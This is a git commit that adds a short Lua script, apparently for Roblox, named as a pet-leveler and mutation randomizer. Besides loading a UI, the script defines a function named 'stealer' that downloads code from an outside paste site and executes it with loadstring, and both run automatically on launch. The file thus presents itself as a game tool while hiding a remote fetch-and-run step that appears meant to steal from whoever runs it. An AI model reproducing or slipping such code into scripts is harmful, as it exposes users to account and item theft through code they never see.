ad90ec5b11025a67e4bd0779753b2c3641215356
Lib <ybanezjosevincent.bshm.cpc@gmail.com>
2025-08-04 17:10:54 +0800

    Create petleveler.mutationrandomizer.lua

---
+++ petleveler.mutationrandomizer.lua
@@ -0,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet("https://pastefy.app/CErSkGH0/raw"))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHubsIds/SerosScript/refs/heads/main/Loader/LoaderV3.lua"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
